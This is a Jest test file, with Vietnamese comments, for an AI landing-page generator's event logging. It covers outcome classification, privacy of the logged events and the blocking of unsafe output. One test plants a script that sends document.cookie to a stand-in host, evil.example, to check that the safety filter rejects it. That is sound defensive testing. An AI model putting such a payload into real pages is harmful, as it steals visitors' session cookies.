import { afterEach, beforeEach, describe, expect, it, jest } from '@jest/globals';

/**
 * PR-10 mục 3(c) (B-8): dòng `[LandingAI] done` thành BẢN GHI BỀN (ai_call_events, tầng 'app'): một dòng mỗi lượt sinh/sửa với outcome
 * phân loại đúng (ok / client_closed / blocked / parse_failed / timeout / busy / error), kèm chủ + người thao tác + số đếm; không nội dung trang.
 * Ranh giới giả lập: Gemini (`generateWithBudget`), hồ sơ doanh nghiệp, và `recordAiCallEvent` (sổ bền). Phần còn lại là mã thật.
 */
const generateWithBudget = jest.fn();
const recordAiCallEvent = jest.fn(() => Promise.resolve(true));

jest.unstable_mockModule('../businessProfile.service.js', () => ({
  default: { getContextForLandingAi: jest.fn(async () => '') },
}));
jest.unstable_mockModule('../aiUsageMeter.service.js', () => ({ default: { generateWithBudget } }));
jest.unstable_mockModule('../aiCallEvents.service.js', () => ({
  recordAiCallEvent,
  AI_CALL_LAYER: { GEMINI: 'gemini', APP: 'app' },
  AI_CALL_OUTCOME: {
    OK: 'ok', ERROR: 'error', BUSY: 'busy', TIMEOUT: 'timeout', FALLBACK_OK: 'fallback_ok',
    PARSE_FAILED: 'parse_failed', CLIENT_CLOSED: 'client_closed', BLOCKED: 'blocked',
  },
}));

const { default: aiLandingPageService, classifyLandingDoneOutcome } = await import('../aiLandingPage.service.js');
const { createClientAbortError } = await import('../../../utils/aiAbort.util.js');

const GOOD_PAGE =
  '<!DOCTYPE html><html lang="vi"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>' +
  '<title>T</title><script src="https://cdn.tailwindcss.com"></script></head><body><h1>Khoá học</h1>' +
  '<form data-founderai-capture>' +
  '<input type="text" name="name" /><input type="email" name="email" /><input type="tel" name="phone" />' +
  '<label><input type="checkbox" name="marketingConsent" /> Đồng ý nhận thông tin</label>' +
  '<button type="submit">Đăng ký</button></form></body></html>';
const okGeneration = (html = GOOD_PAGE) => ({ text: JSON.stringify({ title: 'T', html }), blockReason: null, finishReason: 'STOP', usage: { outputTokens: 321 } });

describe('classifyLandingDoneOutcome', () => {
  it.each([
    [{ outcome: 'success' }, 'ok'],
    [{ outcome: 'error', clientClosed: 1, errorCode: 'AI_CLIENT_ABORTED' }, 'client_closed'],
    [{ outcome: 'error', clientClosed: 1, errorCode: 'AI_TIMEOUT' }, 'client_closed'],
    [{ outcome: 'error', errorCode: 'AI_CLIENT_ABORTED' }, 'client_closed'],
    [{ outcome: 'error', errorCode: 'AI_TIMEOUT' }, 'timeout'],
    [{ outcome: 'error', errorCode: 'AI_PROVIDER_BUSY' }, 'busy'],
    [{ outcome: 'error', errorCode: 'LANDING_UNSAFE_OUTPUT' }, 'blocked'],
    [{ outcome: 'error', errorCode: 'LANDING_FAKE_IMAGE_URL' }, 'blocked'],
    [{ outcome: 'error', errorCode: 'LANDING_FORM_PLACEHOLDER' }, 'blocked'],
    [{ outcome: 'error', errorCode: 'LANDING_PATCH_DELETES_TOO_MUCH' }, 'blocked'],
    [{ outcome: 'error', errorCode: 'LANDING_PATCH_NOT_FOUND' }, 'parse_failed'],
    [{ outcome: 'error', errorCode: 'LANDING_PATCH_EMPTY' }, 'parse_failed'],
    [{ outcome: 'error', errorCode: 'HTTP_422' }, 'parse_failed'],
    [{ outcome: 'error', errorCode: 'GEMINI_404' }, 'error'],
    [{ outcome: 'error', errorCode: 'Error' }, 'error'],
    [{ outcome: 'error' }, 'error'],
  ])('%j → %s', (input, expected) => {
    expect(classifyLandingDoneOutcome(input)).toBe(expected);
  });
});

describe('B-8 — dòng done của lượt landing thành bản ghi bền', () => {
  beforeEach(() => {
    generateWithBudget.mockReset();
    recordAiCallEvent.mockClear();
    jest.spyOn(console, 'log').mockImplementation(() => {});
    jest.spyOn(console, 'warn').mockImplementation(() => {});
  });
  afterEach(() => jest.restoreAllMocks());

  it('sinh trang thành công → ĐÚNG một sự kiện landing_generate/ok, mang chủ + người thao tác + số đếm, KHÔNG mang html/prompt', async () => {
    generateWithBudget.mockResolvedValue(okGeneration());

    await aiLandingPageService.generate({ userId: 7, actorUserId: 9, prompt: 'Landing bán khoá học cực kỳ bí mật', streamed: 1 });

    expect(recordAiCallEvent).toHaveBeenCalledTimes(1);
    const event = recordAiCallEvent.mock.calls[0][0];
    expect(event).toMatchObject({
      layer: 'app', feature: 'landing_generate', outcome: 'ok', errorCode: null, ownerUserId: 7, actorUserId: 9,
      meta: { mode: 'generate', finishReason: 'STOP', outputTokens: 321, streamed: 1 },
    });
    expect(event.durationMs).toBeGreaterThanOrEqual(0);
    expect(event.meta.htmlChars).toBe(GOOD_PAGE.length);
    expect(JSON.stringify(event)).not.toMatch(/bí mật|Khoá học|<!DOCTYPE/);
  });

  it('khách đóng kết nối giữa lúc Gemini chạy → landing_generate / client_closed (không phải error)', async () => {
    const ctrl = new AbortController();
    generateWithBudget.mockImplementation(async () => { ctrl.abort(); throw createClientAbortError(); });

    await expect(aiLandingPageService.generate({ userId: 7, actorUserId: 9, prompt: 'x', signal: ctrl.signal, streamed: 1 }))
      .rejects.toMatchObject({ code: 'AI_CLIENT_ABORTED' });

    expect(recordAiCallEvent).toHaveBeenCalledTimes(1);
    expect(recordAiCallEvent.mock.calls[0][0]).toMatchObject({
      feature: 'landing_generate', outcome: 'client_closed', errorCode: 'AI_CLIENT_ABORTED', ownerUserId: 7, actorUserId: 9,
    });
  });

  it('Gemini hết giờ / quá tải → timeout / busy, ghi mã lỗi', async () => {
    generateWithBudget.mockRejectedValueOnce(Object.assign(new Error('chậm'), { code: 'AI_TIMEOUT', name: 'AbortError' }));
    await expect(aiLandingPageService.generate({ userId: 7, prompt: 'x' })).rejects.toBeTruthy();
    expect(recordAiCallEvent.mock.calls[0][0]).toMatchObject({ outcome: 'timeout', errorCode: 'AI_TIMEOUT' });

    recordAiCallEvent.mockClear();
    generateWithBudget.mockRejectedValueOnce(Object.assign(new Error('bận'), { code: 'AI_PROVIDER_BUSY', status: 503 }));
    await expect(aiLandingPageService.generate({ userId: 7, prompt: 'x' })).rejects.toBeTruthy();
    expect(recordAiCallEvent.mock.calls[0][0]).toMatchObject({ outcome: 'busy', errorCode: 'AI_PROVIDER_BUSY' });
  });

  it('AI trả thứ không phải HTML → parse_failed; chốt an toàn chặn script lạ → blocked (kèm loại bị bắt)', async () => {
    generateWithBudget.mockResolvedValue({ text: 'xin lỗi tôi không làm được', blockReason: null, finishReason: 'STOP', usage: {} });
    await expect(aiLandingPageService.generate({ userId: 7, prompt: 'x' })).rejects.toBeTruthy();
    expect(recordAiCallEvent.mock.calls[0][0]).toMatchObject({ outcome: 'parse_failed', errorCode: 'HTTP_422' });

    recordAiCallEvent.mockClear();
    const unsafe = GOOD_PAGE.replace('<h1>', '<script>fetch("https://evil.example/c?d=" + document.cookie)</script><h1>');
    generateWithBudget.mockResolvedValue(okGeneration(unsafe));
    await expect(aiLandingPageService.generate({ userId: 7, prompt: 'x' })).rejects.toMatchObject({ code: 'LANDING_UNSAFE_OUTPUT' });
    expect(recordAiCallEvent).toHaveBeenCalledTimes(1);
    expect(recordAiCallEvent.mock.calls[0][0]).toMatchObject({ outcome: 'blocked', errorCode: 'LANDING_UNSAFE_OUTPUT' });
    expect(recordAiCallEvent.mock.calls[0][0].meta.unsafeKinds).toBeTruthy();
  });

  it('sổ bền hỏng (ném đồng bộ) → lượt sinh vẫn trả trang bình thường', async () => {
    generateWithBudget.mockResolvedValue(okGeneration());
    recordAiCallEvent.mockImplementationOnce(() => { throw new Error('sổ bền hỏng'); });
    await expect(aiLandingPageService.generate({ userId: 7, prompt: 'x' })).resolves.toMatchObject({ title: 'T' });
  });

  it('sửa trang: feature landing_edit với chủ + người thao tác', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', edits: [{ find: '<button type="submit">Đăng ký</button>', replace: '<button type="submit">Gửi ngay</button>' }], changeSummary: 'Đổi nút' }),
      blockReason: null, finishReason: 'STOP', usage: { outputTokens: 40 },
    });

    await aiLandingPageService.editHtml({ userId: 7, actorUserId: 9, currentHtml: GOOD_PAGE, instruction: 'Đổi chữ nút' });

    expect(recordAiCallEvent).toHaveBeenCalledTimes(1);
    expect(recordAiCallEvent.mock.calls[0][0]).toMatchObject({
      layer: 'app', feature: 'landing_edit', outcome: 'ok', ownerUserId: 7, actorUserId: 9, meta: { mode: 'edit' },
    });
  });
});
